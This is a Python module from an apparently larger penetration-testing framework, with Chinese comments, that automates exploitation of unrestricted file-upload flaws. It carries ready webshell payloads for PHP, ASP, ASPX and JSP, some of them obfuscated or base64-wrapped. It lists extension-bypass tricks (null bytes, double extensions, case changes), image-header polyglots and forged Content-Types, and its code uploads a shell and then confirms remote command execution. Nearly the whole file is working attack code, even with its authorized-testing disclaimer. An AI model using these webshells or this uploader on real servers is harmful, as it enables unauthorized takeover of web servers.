#!/usr/bin/env python3
"""
文件上传利用器 - 文件上传漏洞利用

支持场景:
- Webshell上传
- 图片马上传
- 双扩展名绕过
- Content-Type绕过
- 大小写绕过

警告: 本工具仅用于授权安全测试
"""

import logging
import random
import re
import string
import time
from typing import Any, Dict, List, Optional

from ..engine import (
    BaseExploiter,
    ExploitResult,
    ExploitStatus,
    ExploitType,
    ShellInfo,
    register_exploiter,
)

logger = logging.getLogger(__name__)


@register_exploiter(["file_upload", "unrestricted_upload"])
class FileUploadExploiter(BaseExploiter):
    """文件上传漏洞利用器"""

    name = "file_upload_exploiter"
    supported_vuln_types = ["file_upload", "unrestricted_upload"]
    exploit_type = ExploitType.FILE_WRITE

    # Webshell模板
    WEBSHELL_TEMPLATES = {
        "php": {
            "simple": '<?php system($_GET["cmd"]); ?>',
            "eval": '<?php eval($_POST["code"]); ?>',
            "hidden": '<?php $a="sys"."tem";$a($_GET["c"]); ?>',
            "base64": '<?php eval(base64_decode($_POST["e"])); ?>',
            "gzinflate": '<?php eval(gzinflate(base64_decode("YOUR_ENCODED_PAYLOAD"))); ?>',
        },
        "asp": {
            "simple": '<%eval request("cmd")%>',
            "execute": '<%execute(request("cmd"))%>',
        },
        "aspx": {
            "simple": '<%@ Page Language="C#" %><% System.Diagnostics.Process.Start("cmd.exe", "/c " + Request["cmd"]); %>',
        },
        "jsp": {
            "simple": '<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>',
            "full": """<%@ page import="java.io.*" %>
<% String cmd = request.getParameter("cmd");
   Process p = Runtime.getRuntime().exec(cmd);
   BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
   String line; while((line=br.readLine())!=null) out.println(line); %>""",
        },
    }

    # 图片马头 (GIF89a)
    IMAGE_HEADERS = {
        "gif": b"GIF89a",
        "png": b"\x89PNG\r\n\x1a\n",
        "jpg": b"\xff\xd8\xff\xe0",
    }

    # 扩展名变体
    EXTENSION_VARIANTS = {
        "php": [
            ".php",
            ".phtml",
            ".php3",
            ".php4",
            ".php5",
            ".php7",
            ".phps",
            ".phar",
            ".pHp",
            ".PhP",
            ".PHP",
            ".php.jpg",
            ".php.png",
            ".php%00.jpg",
            ".php\x00.jpg",
        ],
        "asp": [".asp", ".asa", ".cer", ".cdx", ".Asp", ".ASP"],
        "aspx": [".aspx", ".ashx", ".asmx", ".Aspx", ".ASPX"],
        "jsp": [".jsp", ".jspx", ".jspf", ".Jsp", ".JSP"],
    }

    # Content-Type变体
    CONTENT_TYPES = {
        "image": ["image/gif", "image/png", "image/jpeg"],
        "text": ["text/plain", "application/octet-stream"],
        "multipart": ["multipart/form-data"],
    }

    def exploit(
        self, detection_result: Any, targets: Optional[Dict[str, Any]] = None, **kwargs
    ) -> ExploitResult:
        """
        执行文件上传利用

        Args:
            detection_result: 漏洞检测结果
            targets: 利用目标配置
                - shell_type: webshell类型 (php/asp/aspx/jsp)
                - upload_path: 上传路径
                - verify_shell: 是否验证shell
        """
        start_time = time.time()

        # 提取检测信息
        url = getattr(detection_result, "url", "")
        param = getattr(detection_result, "param", "")  # 文件参数名
        extra = getattr(detection_result, "extra", {}) or {}

        if not url:
            return self._create_result(
                status=ExploitStatus.NOT_APPLICABLE,
                vuln_type="file_upload",
                url=url,
                error="缺少URL信息",
            )

        # 获取配置
        targets = targets or {}
        shell_type = extra.get("shell_type") or self._detect_shell_type(url)
        file_param = param or extra.get("file_param", "file")
        timeout = targets.get("timeout", 30)
        verify_shell = targets.get("verify_shell", True)

        logger.info("[FileUploadExploiter] 开始利用 URL=%s, type=%s", url, shell_type)

        # 生成shell内容和文件名
        shell_content = self._generate_shell(shell_type)
        filenames = self._generate_filenames(shell_type)

        # 尝试上传
        upload_result = None
        for filename in filenames[:8]:  # 限制尝试次数
            result = self._try_upload(url, file_param, filename, shell_content, shell_type, timeout)
            if result["success"]:
                upload_result = result
                logger.info("[FileUploadExploiter] 上传成功: %s", filename)
                break

        execution_time = (time.time() - start_time) * 1000

        if upload_result:
            shell_url = upload_result.get("shell_url", "")
            shell_verified = False

            # 验证shell
            if verify_shell and shell_url:
                shell_verified = self._verify_shell(shell_url, shell_type, timeout)

            shell_info = ShellInfo(
                shell_type="webshell",
                os_type="unknown",
                shell_path=shell_url,
                verified=shell_verified,
            )

            return self._create_result(
                status=ExploitStatus.SUCCESS if shell_verified else ExploitStatus.PARTIAL,
                vuln_type="file_upload",
                url=url,
                shell=shell_info,
                data={
                    "uploaded_file": upload_result.get("filename"),
                    "shell_url": shell_url,
                    "shell_verified": shell_verified,
                },
                evidence=f"成功上传Webshell: {upload_result.get('filename')}",
                execution_time_ms=execution_time,
                metadata={
                    "shell_type": shell_type,
                    "file_param": file_param,
                },
            )
        else:
            return self._create_result(
                status=ExploitStatus.FAILED,
                vuln_type="file_upload",
                url=url,
                error="文件上传利用失败",
                execution_time_ms=execution_time,
                metadata={"shell_type": shell_type},
            )

    def _detect_shell_type(self, url: str) -> str:
        """根据URL检测应使用的shell类型"""
        url_lower = url.lower()

        if any(ext in url_lower for ext in [".php", "php"]):
            return "php"
        if any(ext in url_lower for ext in [".asp", "asp"]):
            return "asp"
        if any(ext in url_lower for ext in [".aspx", "aspx"]):
            return "aspx"
        if any(ext in url_lower for ext in [".jsp", "jsp", "java"]):
            return "jsp"

        return "php"  # 默认PHP

    def _generate_shell(self, shell_type: str, variant: str = "simple") -> bytes:
        """生成webshell内容"""
        templates = self.WEBSHELL_TEMPLATES.get(shell_type, self.WEBSHELL_TEMPLATES["php"])
        shell_code = templates.get(variant, templates["simple"])

        # 可选：添加图片头绕过
        # 这里默认不添加，可以通过配置启用
        return shell_code.encode("utf-8")

    def _generate_shell_with_image_header(self, shell_type: str, image_type: str = "gif") -> bytes:
        """生成带图片头的webshell（图片马）"""
        header = self.IMAGE_HEADERS.get(image_type, self.IMAGE_HEADERS["gif"])
        shell_code = self._generate_shell(shell_type)
        return header + shell_code

    def _generate_filenames(self, shell_type: str) -> List[str]:
        """生成文件名变体列表"""
        base_name = "".join(random.choices(string.ascii_lowercase, k=8))
        filenames = []

        # 获取扩展名变体
        extensions = self.EXTENSION_VARIANTS.get(shell_type, self.EXTENSION_VARIANTS["php"])

        for ext in extensions:
            filenames.append(f"{base_name}{ext}")

        # 添加带图片扩展名的变体
        for img_ext in [".jpg", ".png", ".gif"]:
            filenames.append(f"{base_name}{extensions[0]}{img_ext}")
            filenames.append(f"{base_name}{img_ext}{extensions[0]}")

        return filenames

    def _try_upload(
        self,
        url: str,
        file_param: str,
        filename: str,
        content: bytes,
        shell_type: str,
        timeout: int,
    ) -> Dict[str, Any]:
        """尝试上传文件"""
        try:
            import requests

            # 构建multipart数据
            files = {file_param: (filename, content, self._get_content_type(filename))}

            response = requests.post(
                url,
                files=files,
                timeout=timeout,
                verify=False,
                allow_redirects=True,
                headers={
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                },
            )

            # 检查上传是否成功
            if response.status_code == 200:
                # 尝试从响应中提取文件路径
                shell_url = self._extract_file_url(response.text, filename, url)
                if shell_url:
                    return {
                        "success": True,
                        "filename": filename,
                        "shell_url": shell_url,
                        "response": response.text[:500],
                    }

                # 即使没有提取到URL，如果没有错误提示也认为可能成功
                error_indicators = ["error", "failed", "invalid", "not allowed", "denied"]
                if not any(ind in response.text.lower() for ind in error_indicators):
                    return {
                        "success": True,
                        "filename": filename,
                        "shell_url": "",  # URL未知
                        "response": response.text[:500],
                    }

            return {"success": False}

        except Exception as e:
            logger.debug("[FileUploadExploiter] 上传异常: %s", e)
            return {"success": False, "error": str(e)}

    def _get_content_type(self, filename: str) -> str:
        """根据文件名获取Content-Type"""
        filename_lower = filename.lower()

        if filename_lower.endswith((".jpg", ".jpeg")):
            return "image/jpeg"
        if filename_lower.endswith(".png"):
            return "image/png"
        if filename_lower.endswith(".gif"):
            return "image/gif"

        # 使用伪装的Content-Type
        return "image/gif"

    def _extract_file_url(self, response: str, filename: str, base_url: str) -> str:
        """从响应中提取上传文件的URL"""
        # 尝试从JSON响应提取
        patterns = [
            r'"url"\s*:\s*"([^"]+)"',
            r'"path"\s*:\s*"([^"]+)"',
            r'"file"\s*:\s*"([^"]+)"',
            r'"src"\s*:\s*"([^"]+)"',
            r'href=["\']([^"\']*' + re.escape(filename) + r'[^"\']*)["\']',
            r'src=["\']([^"\']*' + re.escape(filename) + r'[^"\']*)["\']',
        ]

        for pattern in patterns:
            match = re.search(pattern, response, re.IGNORECASE)
            if match:
                file_url = match.group(1)
                if not file_url.startswith("http"):
                    # 转换为绝对URL
                    from urllib.parse import urljoin

                    file_url = urljoin(base_url, file_url)
                return file_url

        # 猜测常见上传路径
        base_name = filename.split(".")[0]
        common_paths = [
            f"/uploads/{filename}",
            f"/upload/{filename}",
            f"/files/{filename}",
            f"/images/{filename}",
            f"/static/uploads/{filename}",
        ]

        from urllib.parse import urljoin

        for path in common_paths:
            # 这里只是返回猜测的路径，实际验证在后续步骤
            return urljoin(base_url, path)

        return ""

    def _verify_shell(self, shell_url: str, shell_type: str, timeout: int) -> bool:
        """验证webshell是否可用"""
        if not shell_url:
            return False

        try:
            import requests

            # 根据shell类型构造验证请求
            if shell_type == "php":
                test_url = f"{shell_url}?cmd=echo+SHELL_VERIFIED"
            elif shell_type in ["asp", "aspx"]:
                test_url = f"{shell_url}?cmd=echo+SHELL_VERIFIED"
            elif shell_type == "jsp":
                test_url = f"{shell_url}?cmd=echo+SHELL_VERIFIED"
            else:
                test_url = shell_url

            response = requests.get(test_url, timeout=timeout, verify=False)

            if "SHELL_VERIFIED" in response.text:
                return True

            # 即使没有输出，如果能访问到脚本内容也算成功
            if response.status_code == 200 and len(response.text) > 0:
                # 检查是否执行了而不是下载了
                if "<?php" not in response.text and "<%" not in response.text:
                    return True

        except Exception as e:
            logger.debug("[FileUploadExploiter] Shell验证失败: %s", e)

        return False


def register_upload_exploiter():
    """注册文件上传利用器"""
    return FileUploadExploiter
